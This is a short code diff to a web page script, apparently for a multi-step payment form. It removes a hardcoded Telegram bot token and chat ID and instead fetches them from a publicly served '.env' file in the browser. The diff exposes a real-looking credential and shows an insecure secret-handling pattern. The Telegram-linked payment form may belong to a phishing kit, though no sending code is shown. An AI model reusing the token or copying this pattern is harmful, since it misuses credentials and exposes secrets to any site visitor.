@@ -1,7 +1,24 @@
-document.addEventListener('DOMContentLoaded', function() {
-    // Telegram bot configuration
-    const TELEGRAM_BOT_TOKEN = '8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA';
-    const TELEGRAM_CHAT_ID = '7959372593';
+document.addEventListener('DOMContentLoaded', async function() {
+    // Load environment variables
+    let TELEGRAM_BOT_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
+    
+    try {
+        const envResponse = await fetch('.env');
+        const envText = await envResponse.text();
+        const envLines = envText.split('\n');
+        
+        envLines.forEach(line => {
+            const [key, value] = line.split('=');
+            if (key === 'TELEGRAM_BOT_TOKEN') {
+                TELEGRAM_BOT_TOKEN = value;
+            } else if (key === 'TELEGRAM_CHAT_ID') {
+                TELEGRAM_CHAT_ID = value;
+            }
+        });
+    } catch (error) {
+        console.error('Error loading environment variables:', error);
+    }
 
     // Step navigation
     const nextToPaymentBtn = document.getElementById('nextToPayment');
